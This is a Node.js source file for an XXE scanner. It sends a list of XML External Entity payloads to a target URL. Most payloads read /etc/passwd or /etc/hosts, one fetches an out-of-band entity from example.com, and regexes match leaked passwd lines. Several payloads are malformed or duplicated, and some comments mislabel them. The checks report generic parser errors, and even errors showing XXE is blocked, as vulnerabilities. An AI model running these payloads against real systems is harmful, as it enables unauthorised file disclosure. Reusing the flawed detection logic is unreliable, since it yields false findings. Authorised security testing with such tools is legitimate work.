/**
 * XXE Scanner
 * Detects XML External Entity vulnerabilities
 */

const axios = require('axios');

// XXE Payloads
const XXE_PAYLOADS = [
  // Basic XXE
  '<?xml version="1.0"?><!DOCTYPE foo [<ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  
  // Parameter entity
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
  
  // External DTD
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
  
  // Blind XXE with error-based extraction
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">%xxe;]><foo/>',
  
  // Blind XXE with out-of-band
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://example.com/xxe">%xxe;]><foo/>',
  
  // CDATA injection
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><![CDATA[&xxe]]></foo>',
  
  // XInclude attack
  '<?xml version="1.0"?><foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
  
  // SOAP XXE
  '<?xml version="1.0"?><!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
  
  // JSON-based XXE (if converted to XML)
  '<?xml version="1.0"?><!DOCTYPE foo [<ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  
  // SVG/XML XXE
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><foo>&xxe;</foo></svg>'
];

// XXE detection patterns
const XXE_PATTERNS = [
  // /etc/passwd content
  /root:x:[0-9]+:[0-9]+:/m,
  /daemon:x:[0-9]+:[0-9]+:/m,
  /bin:x:[0-9]+:[0-9]+:/m,
  
  // File system content
  /127\.0\.0\.1\s+localhost/m,
  /\/bin\/bash/m,
  /\/bin\/sh/m,
  
  // XXE error messages
  /external entity expansion/i,
  /ENTITY.*extern/i,
  /未预期的 DTD/i,
  /XML external entity/i,
  /ODTEntities/i,
  
  // Java XXE errors
  /TransformerException/i,
  /SAXParseException/i,
  /ParserException/i,
  /XMLStreamException/i,
  
  // PHP XXE errors
  /SimpleXMLElement/i,
  /DOMDocument.*loadXML/i,
  /XMLReader/i,
  
  // .NET XXE errors
  /XmlException/i,
  /XmlParserContext/i,
  /XDocument/i
];

// Content-Type headers that accept XML
const XML_CONTENT_TYPES = [
  'application/xml',
  'text/xml',
  'application/x-www-form-urlencoded',
  'multipart/form-data'
];

/**
 * Test XXE with a specific payload
 */
async function testXXEPayload(url, payload, contentType = 'application/xml') {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    const response = await axios({
      method: 'POST',
      url,
      headers: {
        'Content-Type': contentType,
        'Accept': 'application/xml, text/xml, */*'
      },
      data: payload,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true
    });

    clearTimeout(timeout);

    const responseText = typeof response.data === 'string'
      ? response.data
      : JSON.stringify(response.data);

    // Check for XXE patterns in response
    for (const pattern of XXE_PATTERNS) {
      if (pattern.test(responseText)) {
        return {
          vulnerable: true,
          payload,
          infoLeaked: true,
          type: 'xxe-file-disclosure',
          confidence: 'high',
          evidence: responseText.substring(0, 500)
        };
      }
    }

    // Check for XXE-specific errors
    const errorPatterns = [
      /未预期的.*DTD/i,
      /Unexpected.*DTD/i,
      /DOCTYPE.*disallowed/i,
      /external entity.*not allowed/i,
      /ENTITY.*extern/i,
      /XML injection/i,
      /Invalid entity/i
    ];

    for (const pattern of errorPatterns) {
      if (pattern.test(responseText)) {
        return {
          vulnerable: true,
          payload,
          infoLeaked: false,
          type: 'xxe-detected',
          confidence: 'medium',
          evidence: responseText.substring(0, 500)
        };
      }
    }

    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    
    const errorText = error.message || '';
    
    // Check for XXE-related errors
    const xxeErrorPatterns = [
      /external entity/i,
      /ENTITY/i,
      /XML/i,
      /SAX/i,
      /Parser/i,
      /DOCTYPE/i,
      /transform/i
    ];

    for (const pattern of xxeErrorPatterns) {
      if (pattern.test(errorText)) {
        return {
          vulnerable: true,
          payload,
          infoLeaked: false,
          type: 'potential-xxe',
          confidence: 'low',
          evidence: errorText
        };
      }
    }
    
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Test for blind XXE using out-of-band detection
 */
async function testBlindXXE(url, payload) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    // This would require a collaborator server in real scenario
    // For now, just send the payload and check for errors
    
    const response = await axios({
      method: 'POST',
      url,
      headers: {
        'Content-Type': 'application/xml',
        'Accept': '*/*'
      },
      data: payload,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true
    });

    clearTimeout(timeout);

    // If no error but also no response, might be blind XXE
    if (response.status >= 200 && response.status < 300 && !response.data) {
      return {
        vulnerable: true,
        payload,
        infoLeaked: false,
        type: 'potential-blind-xxe',
        confidence: 'low',
        evidence: 'Request succeeded with empty response'
      };
    }

    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Test XML parsing with various encodings
 */
async function testXMLEncodings(url) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    const encodings = [
      'UTF-8',
      'UTF-16',
      'UTF-32',
      'ISO-8859-1'
    ];

    for (const encoding of encodings) {
      const payload = `<?xml version="1.0" encoding="${encoding}"?><!DOCTYPE foo [<ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;
      
      const response = await axios({
        method: 'POST',
        url,
        headers: {
          'Content-Type': `application/xml; charset=${encoding}`
        },
        data: payload,
        timeout: 10000,
        signal: controller.signal,
        validateStatus: () => true
      });

      const responseText = typeof response.data === 'string'
        ? response.data
        : JSON.stringify(response.data);

      for (const pattern of XXE_PATTERNS) {
        if (pattern.test(responseText)) {
          clearTimeout(timeout);
          return {
            vulnerable: true,
            payload,
            infoLeaked: true,
            type: 'xxe-encoding-bypass',
            confidence: 'high',
            evidence: `XXE detected with encoding: ${encoding}`
          };
        }
      }
    }

    clearTimeout(timeout);
    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Main scan function
 */
async function scan(target) {
  const { url } = target;

  const results = {
    vulnerable: false,
    vulnerabilities: [],
    testedPayloads: 0
  };

  // Test each XXE payload
  for (const payload of XXE_PAYLOADS) {
    results.testedPayloads++;

    // Try with XML content type
    let result = await testXXEPayload(url, payload, 'application/xml');
    
    if (result.vulnerable) {
      results.vulnerable = true;
      results.vulnerabilities.push(result);

      if (result.confidence === 'high') {
        return { success: true, ...results };
      }
    }

    // Try with text/xml
    result = await testXXEPayload(url, payload, 'text/xml');
    
    if (result.vulnerable) {
      results.vulnerable = true;
      results.vulnerabilities.push(result);

      if (result.confidence === 'high') {
        return { success: true, ...results };
      }
    }
  }

  // Test XML encodings
  const encodingResult = await testXMLEncodings(url);
  if (encodingResult.vulnerable) {
    results.vulnerable = true;
    results.vulnerabilities.push(encodingResult);
  }

  return {
    success: true,
    ...results
  };
}

module.exports = { scan };